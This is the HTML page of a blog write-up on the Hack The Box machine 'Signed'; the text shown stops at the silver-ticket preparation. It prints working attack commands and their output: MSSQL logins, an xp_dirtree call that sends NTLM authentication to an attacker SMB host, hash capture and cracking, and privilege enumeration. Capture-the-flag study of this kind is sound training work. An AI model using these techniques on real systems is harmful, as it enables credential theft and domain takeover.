@@ -1,0 +1,837 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/02/07/hackthebox-signed/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewSigned is a medium-difficulty machine from Hack The Box that starts with an exposed MSSQL service -&gt; authenticate as scott, then coerce the MSSQL service account to authenticate to our SMB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Signed">
+<meta property="og:url" content="http://fouedsaidi.com/2026/02/07/Hackthebox-Signed/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewSigned is a medium-difficulty machine from Hack The Box that starts with an exposed MSSQL service -&gt; authenticate as scott, then coerce the MSSQL service account to authenticate to our SMB">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Signed/Signed.png">
+<meta property="article:published_time" content="2026-02-07T18:39:19.000Z">
+<meta property="article:modified_time" content="2026-02-07T18:47:50.291Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Signed/Signed.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Signed -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Signed</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-02-07 21:39:19</span>
+        <span class="mobile">2026-02-07 21:39:19</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-02-07 21:47:50</span>
+            <span class="mobile">2026-02-07 21:47:50</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Signed is a medium-difficulty machine from Hack The Box that starts with an exposed MSSQL service -&gt; authenticate as <code>scott</code>, then coerce the MSSQL service account to authenticate to our SMB server via <code>xp_dirtree</code> and capture an NTLMv2 hash for <code>mssqlsvc</code> &#x3D;&gt; crack it &#x3D;&gt; enumerate impersonation privileges and logins &#x3D;&gt; silver ticket path &#x3D;&gt; forge a silver ticket with Domain Admins group membership to gain <code>sysadmin</code> on MSSQL &#x3D;&gt; enable <code>xp_cmdshell</code> for code execution &#x3D;&gt; pivot through Ligolo-ng to access the DC locally &#x3D;&gt; abuse PetitPotam coercion with a custom DNS record to relay the DC machine account’s NTLM authentication to WinRM and obtain a shell as <code>DC01$</code>.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Signed/Signed.png"
+                      alt="Signed-info-card"
+                ><figcaption>Signed-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a><a href="#Reconnaissance" title="Reconnaissance"></a>Reconnaissance</h2><p>Starting with a port scan, we only see MSSQL on port 1433:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RC0+</span><br><span class="line">|_ms-sql-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_ssl-date: 2025-10-15T03:36:38+00:00; 0s from scanner time.</span><br><span class="line">|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2025-10-14T23:13:27</span><br><span class="line">|_Not valid after:  2055-10-14T23:13:27</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="MSSQL-10-129-193-36-1433"><a href="#MSSQL-10-129-193-36-1433" class="headerlink" title="MSSQL - 10.129.193.36:1433"></a><a href="#MSSQL" title="MSSQL"></a>MSSQL - 10.129.193.36:1433</h2><p>We can connect to the MSSQL instance using the credentials <code>scott:Sm230#C5NatH</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ mssqlclient.py &#x27;signed.thb/scott:&#x27;Sm230#C5NatH&#x27;@10.129.193.36&#x27;</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(DC01): Line 1: Changed database context to &#x27;master&#x27;.</span><br><span class="line">[*] INFO(DC01): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">SQL (scott  guest@master)&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>We land as a <code>guest</code> user. To escalate, we can use <code>xp_dirtree</code> to coerce the MSSQL service account into authenticating to our SMB server and capture its NTLMv2 hash with <code>Responder</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SQL (scott  guest@master)&gt; xp_dirtree \\10.10.16.7\kujen</span><br><span class="line">subdirectory   depth   file</span><br><span class="line">------------   -----   ----</span><br><span class="line">SQL (scott  guest@master)&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>And we catch the hash:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Listening for events...</span><br><span class="line"></span><br><span class="line">[SMB] NTLMv2-SSP Client   : 10.129.193.36</span><br><span class="line">[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:cbcb5744add5552d:F0DB25B201809C8018AFA09C93991F6D:010100000000000000CE6097643DDC0124F58E299CB60F040000000002000800520036005500530001001E00570049004E002D0059005500320043004D0036004900460034004C005A0004003400570049004E002D0059005500320043004D0036004900460034004C005A002E0052003600550053002E004C004F00430041004C000300140052003600550053002E004C004F00430041004C000500140052003600550053002E004C004F00430041004C000700080000CE6097643DDC0106000400020000000800300030000000000000000000000000300000C3BE22B065B37085B753D2A5AC12352F03F8688FD6FFEC9FC4AF56DEDD3E3B1B0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0037000000000000000000</span><br></pre></td></tr></table></figure></div>
+
+<p>Cracking the hash with <code>john</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$john -w:/usr/share/wordlists/rockyou.txt hash</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">purPLE9795!@     (mssqlsvc)</span><br><span class="line">1g 0:00:00:02 DONE (2025-10-14 23:47) 0.4524g/s 2030Kp/s 2030Kc/s 2030KC/s purcitititya..puppuh</span><br><span class="line">Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably</span><br><span class="line">Session completed.</span><br></pre></td></tr></table></figure></div>
+
+<p>We can now re-authenticate to MSSQL as <code>mssqlsvc</code> with Windows authentication:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-mssqlclient &#x27;mssqlsvc:purPLE9795!@&#x27;@10.129.193.36 -windows-auth</span><br><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(DC01): Line 1: Changed database context to &#x27;master&#x27;.</span><br><span class="line">[*] INFO(DC01): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">SQL (SIGNED\mssqlsvc  guest@master)&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Enumeration-Silver-Ticket"><a href="#Enumeration-Silver-Ticket" class="headerlink" title="Enumeration &amp; Silver Ticket"></a><a href="#Enumeration" title="Enumeration"></a>Enumeration &amp; Silver Ticket</h3><p>Still a <code>guest</code> though. Let’s enumerate what we can do:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SQL (SIGNED\mssqlsvc  guest@master)&gt; enum_users</span><br><span class="line">UserName                            RoleName   LoginName                           DefDBName   DefSchemaName       UserID                                                                   SID</span><br><span class="line">---------------------------------   --------   ---------------------------------   ---------   -------------   ----------   -------------------------------------------------------------------</span><br><span class="line">##MS_AgentSigningCertificate##      public     ##MS_AgentSigningCertificate##      master      NULL            b&#x27;6         &#x27;   b&#x27;010600000000000901000000fb1b6ce60eda55e1d3dde93b99db322bfc435563&#x27;</span><br><span class="line"></span><br><span class="line">##MS_PolicyEventProcessingLogin##   public     ##MS_PolicyEventProcessingLogin##   master      dbo             b&#x27;5         &#x27;                                   b&#x27;56f12609fb4eb548906b5a62effb1840&#x27;</span><br><span class="line"></span><br><span class="line">dbo                                 db_owner   sa                                  master      dbo             b&#x27;1         &#x27;                                                                 b&#x27;01&#x27;</span><br><span class="line"></span><br><span class="line">guest                               public     NULL                                NULL        guest           b&#x27;2         &#x27;                                                                 b&#x27;00&#x27;</span><br><span class="line"></span><br><span class="line">INFORMATION_SCHEMA                  public     NULL                                NULL        NULL            b&#x27;3         &#x27;                                                                  NULL</span><br><span class="line"></span><br><span class="line">sys                                 public     NULL                                NULL        NULL            b&#x27;4         &#x27;                                                                  NULL</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SQL (SIGNED\mssqlsvc  guest@master)&gt; enum_impersonate</span><br><span class="line">execute as   database   permission_name   state_desc   grantee    grantor</span><br><span class="line">----------   --------   ---------------   ----------   --------   ----------------------------</span><br><span class="line">b&#x27;USER&#x27;      msdb       IMPERSONATE       GRANT        dc_admin   MS_DataCollectorInternalUser</span><br></pre></td></tr></table></figure></div>
+
+<p>We can impersonate <code>dc_admin</code> in the <code>msdb</code> database. Checking logins, we also see that <code>SIGNED\IT</code> is a <code>sysadmin</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">SQL (SIGNED\mssqlsvc  guest@master)&gt; enum_logins</span><br><span class="line">name                                type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin</span><br><span class="line">---------------------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------</span><br><span class="line">sa                                  SQL_LOGIN                 0          1               0             0            0              0           0           0           0</span><br><span class="line"></span><br><span class="line">##MS_PolicyEventProcessingLogin##   SQL_LOGIN                 1          0               0             0            0              0           0           0           0</span><br><span class="line"></span><br><span class="line">##MS_PolicyTsqlExecutionLogin##     SQL_LOGIN                 1          0               0             0            0              0           0           0           0</span><br><span class="line"></span><br><span class="line">SIGNED\IT                           WINDOWS_GROUP             0          1               0             0            0              0           0           0           0</span><br><span class="line"></span><br><span class="line">NT SERVICE\SQLWriter                WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0</span><br><span class="line"></span><br><span class="line">NT SERVICE\Winmgmt                  WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0</span><br><span class="line"></span><br><span class="line">NT SERVICE\MSSQLSERVER              WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0</span><br><span class="line"></span><br><span class="line">NT AUTHORITY\SYSTEM                 WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0</span><br><span class="line"></span><br><span class="line">NT SERVICE\SQLSERVERAGENT           WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0</span><br><span class="line"></span><br><span class="line">NT SERVICE\SQLTELEMETRY             WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0</span><br><span class="line"></span><br><span class="line">scott                               SQL_LOGIN                 0          0               0             0            0              0           0           0           0</span><br><span class="line"></span><br><span class="line">SIGNED\Domain Users                 WINDOWS_GROUP             0          0               0             0            0              0           0           0           0</span><br><span class="line"></span><br><span class="line">SQL (SIGNED\mssqlsvc  guest@master)&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>Since we own the <code>mssqlsvc</code> service account password, we can forge a <strong>Silver Ticket</strong> and inject ourselves into the <code>Domain Admins</code> group (which is part of <code>SIGNED\IT</code>). First, we grab the Domain Admins SID:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SQL (SIGNED\mssqlsvc  guest@master)&gt; select SUSER_SID(&#x27;SIGNED\Domain Admins&#x27;)</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">b&#x27;0105000000000005150000005b7bb0f398aa2245ad4a1ca400020000&#x27;</span><br><span class="line"></span><br><span class="line">SQL (SIGNED\mssqlsvc  guest@master)&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>Converting the raw bytes to a SID:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; <span class="variable">$sidBytes</span> = [<span class="built_in">byte</span>[]] (<span class="number">0</span>x01,<span class="number">0</span>x05,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x05,<span class="number">0</span>x15,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x00,<span class="number">0</span>x5b,<span class="number">0</span>x7b,<span class="number">0</span>xb0,<span class="number">0</span>xf3,<span class="number">0</span>x98,<span class="number">0</span>xaa,<span class="number">0</span>x22,<span class="number">0</span>x45,<span class="number">0</span>xad,<span class="number">0</span>x4a,<span class="number">0</span>x1c,<span class="number">0</span>xa4,<span class="number">0</span>x00,<span class="number">0</span>x02,<span class="number">0</span>x00,<span class="number">0</span>x00)</span><br><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; <span class="variable">$sid</span> = <span class="built_in">New-Object</span> System.Security.Principal.SecurityIdentifier(<span class="variable">$sidBytes</span>, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; <span class="variable">$sid</span>.Value</span><br><span class="line">S<span class="literal">-1-5-21-4088429403-1159899800-2753317549-512</span></span><br></pre></td></tr></table></figure></div>
+
